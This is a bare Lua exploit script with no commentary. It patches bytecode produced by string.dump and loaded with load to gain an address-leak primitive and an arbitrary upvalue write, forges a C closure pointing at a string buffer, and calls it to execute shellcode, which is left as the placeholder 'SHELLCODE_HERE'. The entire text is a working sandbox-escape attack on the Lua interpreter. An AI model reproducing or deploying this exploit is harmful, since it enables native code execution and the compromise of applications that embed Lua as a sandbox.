as_num = string.dump(function(...) for n = ..., ..., 0 do return n end end)
as_num = as_num:gsub("\x21", "\x17", 1)
as_num = assert(load(as_num))

function addr_of(x) return as_num(x) * 2^1000 * 2^74 end

function ub8(n)
  local t = {}
  for i = 1, 8 do
    local b = n % 256
    t[i] = string.char(b)
    n = (n - b) / 256
  end
  return table.concat(t)
end

upval_assign = string.dump(function(...)
  local magic
  (function(func, x)
    (function(func)
      magic = func
    end)(func)
    magic = x
  end)(...)
end)
upval_assign = upval_assign:gsub("(magic\x00\x01\x00\x00\x00\x01)\x00", "%1\x01", 1)
upval_assign = assert(load(upval_assign))

function make_CClosure(f, up)
  local co = coroutine.wrap(function()end)

  local offsetof_CClosure_f = 24
  local offsetof_CClosure_upvalue0 = 32
  local sizeof_TString = 24
  local offsetof_UpVal_v = 16
  local offsetof_Proto_k = 16
  local offsetof_LClosure_proto = 24
  local upval1 = ub8(addr_of(co) + offsetof_CClosure_f)
  local func1 = ub8(addr_of("\x00\x00\x00\x00\x00\x00\x00\x00") - offsetof_Proto_k) .. ub8(addr_of(upval1) + sizeof_TString - offsetof_UpVal_v)
  local upval2 = ub8(addr_of(co) + offsetof_CClosure_upvalue0)
  local func2 = func1:sub(1, 8) .. ub8(addr_of(upval2) + sizeof_TString - offsetof_UpVal_v)
  upval_assign((addr_of(func1) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, f * 2^-1000 * 2^-74)
  upval_assign((addr_of(func2) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, up)
  
  return co
end

sc = "SHELLCODE_HERE"

sc_addr = addr_of(sc) + 0x18
hax = make_CClosure(sc_addr)
hax()
